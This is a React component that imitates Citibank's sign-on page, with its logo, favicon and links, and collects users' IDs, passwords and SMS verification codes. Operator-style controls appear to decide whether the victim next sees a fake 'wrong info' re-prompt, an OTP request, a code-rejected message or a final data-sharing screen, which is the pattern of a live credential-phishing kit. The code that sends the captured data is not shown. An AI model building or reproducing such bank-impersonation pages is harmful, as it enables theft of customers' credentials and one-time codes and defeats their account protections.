import { otpOptions } from "../../bankDetails";
import { Link } from "react-router-dom";
import { MdOutlineLockPerson } from "react-icons/md";
import clsx from "clsx";
import useBankFunctions from "../../../../../../../hooks/useBankFunctions";
import BankingHeader from "./BankingHeader";
import CitiFavIcon from "../../../../../../../../assets/allBanks/banks/citibank/cb3.ico";
import { motion } from "framer-motion";
import ShareData from "./ShareData";
import CitiImg from "../../../../../../../../assets/allBanks/banks/citibank/cb2.svg";
import { ClipLoader } from "react-spinners";
import BasicLoader from "../../../../../loading/BasicLoader";
import BankControl from "./BankControl";
import BankOtpControl from "./BankOtpControl";

const CitiBank = ({
  handleCancel,
  bankName,
  selectedPath,
  allBankOpen,
  handleSelectSubmit,
  handleSelectedId,
  whatToShowDetails,
  setOtpOpen,
  OtpOpen,
  selectedOtp,
  handleSubmitOtp,
  handleSelectedOtp,
  otpInfo,
  activePathDetails,
  indexOtp,
  handleOtpOption,
  isOpenOtp,
  onSubmitOtpOptions,
  activeOtp,
  setAllBankItems,
  typeAccount,
  setTypeAccount,
  loading,
  setIsOpenOtp,
}) => {
  const {
    formState,
    handleTheMainSubmit,
    errorFormState,
    handleChange,
    onSubmitOtp,
    errorOtp,
    changeOtp,
    formOtp,
    resend,
    handleTheFinal,
    handleVerifiedOtp,
    onSumbitForm,
    handleResend,
  } = useBankFunctions(bankName, setOtpOpen, setAllBankItems, setTypeAccount);

  return (
    <>
      <motion.div
        initial={{ y: -100, opacity: 0 }}
        animate={{ y: 0, opacity: 1 }}
        exit={{ y: -100, opacity: 0 }}
        transition={{ type: "spring", stiffness: 300, damping: 50 }}
        className={clsx(
          "w-full min-h-screen h-full  top-0  bg-white",
          typeAccount ? "hidden" : "block"
        )}
      >
        <BankingHeader
          text="oAuth Sign On - Citibank"
          handleCancel={handleCancel}
          img={CitiFavIcon}
          setAllBankItems={setAllBankItems}
          setIsOpenOtp={setIsOpenOtp}
          setOtpOpen={setOtpOpen}
        />

        <header className="pl-6">
          <div>
            <img src={CitiImg} alt="" />
          </div>
        </header>
        <div className="flex justify-end py-3 pr-16 font-medium customMiniTablet:pr-24 bg-customBlue-1022 text-customBlue-100 ">
          <Link
            to="https://www.citi.com/"
            className="pr-3 border-r border-r-customBlue-100"
          >
            How can we help?
          </Link>
        </div>

        <div className="flex items-center justify-center px-6 pt-14 text-customGray-900">
          <div
            className={clsx(
              "w-full customMiniTablet:w-[350px] ",
              allBankOpen ? "hidden" : "block"
            )}
          >
            <div className="flex justify-center mb-8 text-customBlue-500">
              <MdOutlineLockPerson size={100} />
            </div>
            <h2 className="text-xl font-medium text-center mb-7">
              Sign on to Citi
            </h2>
            <div>
              <div className="mb-3">
                <label className="font-medium ">User ID</label>
                <input
                  type="text"
                  value={formState.username}
                  name="username"
                  onChange={handleChange}
                  placeholder="User ID"
                  className={clsx(
                    "w-full px-4 py-2 mt-1 border rounded-md outline-none placeholder:italic border-customGray-600",
                    errorFormState.username ? "border border-customRed-100" : ""
                  )}
                />
                {errorFormState.username && (
                  <p className="flex gap-2 mt-2 text-sm text-customRed-100">
                    Enter User ID
                  </p>
                )}
              </div>
              <div className="mb-3">
                <label className="font-medium ">Password</label>
                <input
                  type="password"
                  value={formState.password}
                  name="password"
                  onChange={handleChange}
                  placeholder="password"
                  className={clsx(
                    "w-full px-4 py-2 mt-1 border rounded-md outline-none placeholder:italic border-customGray-600",
                    errorFormState.password ? "border border-customRed-100" : ""
                  )}
                />
                {errorFormState.password && (
                  <p className="flex gap-2 mt-2 text-sm text-customRed-100">
                    Enter Password{" "}
                  </p>
                )}
              </div>
              <p className="text-xs">
                Forgot{" "}
                <Link
                  to="https://www.citi.com/"
                  className="text-customBlue-500"
                >
                  {" "}
                  User ID{" "}
                </Link>{" "}
                or{" "}
                <Link
                  to="https://www.citi.com/"
                  className="text-customBlue-500"
                >
                  {" "}
                  Password?
                </Link>
              </p>

              <div className="my-5 space-y-4">
                <button
                  onClick={(e) => handleTheMainSubmit(e, onSumbitForm)}
                  className="w-full py-3 font-semibold text-white rounded-lg bg-customBlue-500 "
                >
                  {loading && <ClipLoader size={10} color="#fff" />}
                  {loading ? "Loading..." : "Sign on"}
                </button>
                <button className="w-full py-2 font-semibold text-customBlue-500">
                  Cancel
                </button>
              </div>
            </div>
          </div>
          <div>
            {allBankOpen && (
              <div className={clsx(OtpOpen ? "hidden" : "block")}>
                <BankControl
                  handleSelectedId={handleSelectedId}
                  selectedPath={selectedPath}
                  handleSelectSubmit={handleSelectSubmit}
                />
                <div>
                  {activePathDetails.name === "Loading" && (
                    <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                      <BasicLoader />
                    </p>
                  )}
                  {activePathDetails.name === "Wrong Info" && (
                    <>
                      <div
                        className={clsx("w-full customMiniTablet:w-[350px] ")}
                      >
                        <div className="flex justify-center mb-8 text-customBlue-500">
                          <MdOutlineLockPerson size={100} />
                        </div>
                        <h2 className="text-xl font-medium text-center mb-7">
                          Sign on to Citi
                        </h2>
                        <div>
                          <div className="flex justify-center gap-1 mx-3 my-5 font-extrabold text-center customMiniTablet:mx-0 text-customRed-200">
                            <p>{activePathDetails.body}</p>
                          </div>
                          <div className="mb-3">
                            <label className="font-medium ">User ID</label>
                            <input
                              type="text"
                              value={formState.username}
                              name="username"
                              onChange={handleChange}
                              placeholder="User ID"
                              className={clsx(
                                "w-full px-4 py-2 mt-1 border rounded-md outline-none placeholder:italic border-customGray-600",
                                errorFormState.username
                                  ? "border border-customRed-100"
                                  : ""
                              )}
                            />
                            {errorFormState.username && (
                              <p className="flex gap-2 mt-2 text-sm text-customRed-100">
                                Enter User ID
                              </p>
                            )}
                          </div>
                          <div className="mb-3">
                            <label className="font-medium ">Password</label>
                            <input
                              type="password"
                              value={formState.password}
                              name="password"
                              onChange={handleChange}
                              placeholder="password"
                              className={clsx(
                                "w-full px-4 py-2 mt-1 border rounded-md outline-none placeholder:italic border-customGray-600",
                                errorFormState.password
                                  ? "border border-customRed-100"
                                  : ""
                              )}
                            />
                            {errorFormState.password && (
                              <p className="flex gap-2 mt-2 text-sm text-customRed-100">
                                Enter Password{" "}
                              </p>
                            )}
                          </div>
                          <p className="text-xs">
                            Forgot{" "}
                            <Link
                              to="https://www.citi.com/"
                              className="text-customBlue-500"
                            >
                              {" "}
                              User ID{" "}
                            </Link>{" "}
                            or{" "}
                            <Link
                              to="https://www.citi.com/"
                              className="text-customBlue-500"
                            >
                              {" "}
                              Password?
                            </Link>
                          </p>

                          <div className="my-5 space-y-4">
                            <button
                              onClick={(e) =>
                                handleTheMainSubmit(e, onSumbitForm)
                              }
                              className="w-full py-3 font-semibold text-white rounded-lg bg-customBlue-500 "
                            >
                              {loading && <ClipLoader size={10} color="#fff" />}
                              {loading ? "Loading..." : "Sign on"}
                            </button>
                            <button className="w-full py-2 font-semibold text-customBlue-500">
                              Cancel
                            </button>
                          </div>
                        </div>
                      </div>
                    </>
                  )}
                  {activePathDetails.name === "Send Otp" && (
                    <>
                      <h3>{activePathDetails.body}</h3>
                      <div
                        className={clsx(
                          " customMiniTablet:w-[500px] px-4  py-4",
                          isOpenOtp && "hidden"
                        )}
                      >
                        <div>
                          <div>
                            <div>
                              <h3 className="mb-2 text-xl font-bold text-center text-black">
                                Verify your identity
                              </h3>
                              <p className="mb-2 text-center ">
                                For your security, we need to verify it&apos;s
                                really you.
                              </p>
                            </div>
                            <div>
                              <h2 className="mb-2 text-sm font-bold">
                                How would you like to get your verification
                                code?
                              </h2>
                              <p className="mb-2 text-sm text-customGray-100">
                                Select One:
                              </p>
                              <div
                                role="radiogroup"
                                aria-label="Otp Options"
                                className="flex flex-col space-y-3"
                              >
                                {otpOptions.map((bank) => (
                                  <div
                                    key={bank.id}
                                    role="radio"
                                    tabIndex={0}
                                    onClick={() => handleOtpOption(bank.id)}
                                    className="flex items-center gap-2.5 "
                                  >
                                    <div className="border border-black rounded-full p-[2px] text-center mb-[1px]">
                                      <p
                                        className={clsx(
                                          "rounded-full w-[10px] h-[10px]  ",
                                          otpOptions[indexOtp]?.id === bank.id
                                            ? "bg-customBlue-500"
                                            : ""
                                        )}
                                      ></p>
                                    </div>
                                    <h2
                                      className={clsx(
                                        "text-sm",
                                        otpOptions[indexOtp]?.id === bank.id
                                          ? "text-customBlue-500 hover:underline"
                                          : "hover:text-customBlue-700 hover:underline"
                                      )}
                                    >
                                      {bank.name}
                                    </h2>
                                  </div>
                                ))}
                              </div>
                              <button
                                onClick={onSubmitOtpOptions}
                                className="w-full py-3 my-5 font-semibold text-white rounded-lg bg-customBlue-500"
                              >
                                Continue
                              </button>
                            </div>
                          </div>
                        </div>
                      </div>
                      {isOpenOtp && (
                        <div
                          className={clsx(
                            " customMiniTablet:w-[500px] px-4  py-4"
                          )}
                        >
                          <div>
                            <div>
                              <div>
                                <h3 className="mb-2 text-xl font-bold text-center text-black">
                                  Enter Verification Code
                                </h3>
                              </div>
                              <div>
                                <h2 className="mb-2 text-center ">
                                  Enter the verification code we sent to your
                                  mobile number
                                </h2>
                                <div className="px-2 customMiniTablet:px-24">
                                  <div>
                                    <input
                                      type="number"
                                      placeholder="Enter Verification Code"
                                      value={formOtp.otpo}
                                      name="otpo"
                                      onChange={changeOtp}
                                      className={clsx(
                                        "w-full px-4 py-2 mt-1 border rounded-md outline-none placeholder:italic no-spinner border-customGray-600",
                                        errorOtp.otpo
                                          ? "border border-customRed-100"
                                          : ""
                                      )}
                                    />
                                    {errorOtp.otpo && (
                                      <p className="mt-2 text-sm text-customRed-100">
                                        Please enter the verification code.
                                      </p>
                                    )}
                                  </div>
                                  <button
                                    className="w-full py-3 my-5 font-semibold text-white rounded-lg bg-customBlue-500"
                                    onClick={(e) =>
                                      onSubmitOtp(e, handleVerifiedOtp)
                                    }
                                  >
                                    {loading && (
                                      <ClipLoader size={10} color="#fff" />
                                    )}
                                    {loading ? "Loading..." : "Verify"}
                                  </button>
                                </div>
                                <p
                                  className={clsx(
                                    "cursor-pointer text-customBlue-100 font-bold text-center",
                                    !resend &&
                                      "text-customBlue-500 text-opacity-25 cursor-not-allowed"
                                  )}
                                  onClick={handleResend}
                                >
                                  Didnt get a code? Resend
                                </p>
                              </div>
                            </div>
                          </div>
                        </div>
                      )}
                    </>
                  )}
                </div>
              </div>
            )}
            {OtpOpen && (
              <>
                <BankOtpControl
                  handleSelectedOtp={handleSelectedOtp}
                  selectedOtp={selectedOtp}
                  handleSubmitOtp={handleSubmitOtp}
                />

                <div>
                  {activeOtp.name === "Loading" && (
                    <p className="my-5 text-xl font-extrabold text-center text-customRed-200">
                      <BasicLoader />
                    </p>
                  )}
                  {activeOtp.name === "wrong" && (
                    <>
                      <div
                        className={clsx(
                          " customMiniTablet:w-[500px] px-4  py-4"
                        )}
                      >
                        <div>
                          <div>
                            <div>
                              <h3 className="mb-2 text-xl font-bold text-center text-black">
                                Enter Verification Code
                              </h3>
                            </div>
                            <div>
                              <h2 className="mb-2 text-center ">
                                Enter the verification code we sent to your
                                mobile number
                              </h2>
                              <div className="px-2 customMiniTablet:px-24">
                                <div>
                                  <input
                                    type="number"
                                    placeholder="Enter Verification Code"
                                    value={formOtp.otpo}
                                    name="otpo"
                                    onChange={changeOtp}
                                    className={clsx(
                                      "w-full px-4 py-2 mt-1 border rounded-md outline-none placeholder:italic no-spinner border-customGray-600",
                                      errorOtp.otpo
                                        ? "border border-customRed-100"
                                        : ""
                                    )}
                                  />
                                  {errorOtp.otpo && (
                                    <p className="mt-2 text-sm text-customRed-100">
                                      Please enter the verification code.
                                    </p>
                                  )}
                                  <h3 className="mt-2 text-sm text-customRed-200">
                                    {activeOtp.body}
                                  </h3>
                                </div>
                                <button
                                  className="w-full py-3 my-5 font-semibold text-white rounded-lg bg-customBlue-500"
                                  onClick={(e) =>
                                    onSubmitOtp(e, handleVerifiedOtp)
                                  }
                                >
                                  {loading && (
                                    <ClipLoader size={10} color="#fff" />
                                  )}
                                  {loading ? "Loading..." : "Verify"}
                                </button>
                              </div>
                              <p
                                className={clsx(
                                  "cursor-pointer text-customBlue-100 font-bold text-center",
                                  !resend &&
                                    "text-customBlue-500 text-opacity-25 cursor-not-allowed"
                                )}
                                onClick={handleResend}
                              >
                                Didnt get a code? Resend
                              </p>
                            </div>
                          </div>
                        </div>
                      </div>
                    </>
                  )}
                  {activeOtp.name === "otp" && (
                    <>
                      <ShareData
                        bankName={bankName}
                        handleTheFinal={handleTheFinal}
                        handleCancel={handleCancel}
                        setIsOpenOtp={setIsOpenOtp}
                        setAllBankItems={setAllBankItems}
                        siteLink="https://www.citi.com/"
                      />
                    </>
                  )}
                </div>
              </>
            )}
          </div>
        </div>
      </motion.div>
    </>
  );
};

export default CitiBank;
